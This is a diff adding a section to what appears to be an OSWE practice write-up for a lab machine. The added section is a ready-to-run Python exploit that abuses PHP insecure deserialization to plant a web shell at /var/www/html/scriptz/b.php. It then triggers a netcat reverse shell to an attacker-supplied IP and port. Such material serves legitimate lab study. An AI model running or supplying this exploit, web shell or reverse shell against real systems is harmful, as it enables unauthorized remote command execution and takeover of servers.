@@ -175,3 +175,33 @@ We wait a few minutes and root
 
 ![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/926186b9-1111-4759-b938-d3857f211095)
 
+___
+
+Another one click exploit for the web portion of the machine:
+````
+import sys, requests
+
+def main():
+	session = requests.Session()
+	# Inject web shell at /var/www/html/scriptz/b.php via insecure deserialization
+	url = server + "/index.php"
+	data = 'O:3:"Log":2:{s:8:"filename";s:27:"/var/www/html/scriptz/b.php";s:4:"data";s:29:"<?php system($_GET[\'cmd\']);?>";}'
+
+	r = session.post(url, data=("param="+data), headers={"Content-type": "application/x-www-form-urlencoded"})
+
+	# Call a command via RCE
+	url = server + "/scriptz/b.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20{}%20{}%20%3E%2Ftmp%2Ff".format(attacker, port)
+	r = session.get(url)
+
+if __name__ == '__main__':
+	try:
+		server = sys.argv[1].strip()
+		attacker = sys.argv[2].strip()
+		port = sys.argv[3].strip()
+	except:
+		print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+		sys.exit()
+	print("Don't forget to open the listener on port {}!".format(port))
+	main()
+````
+
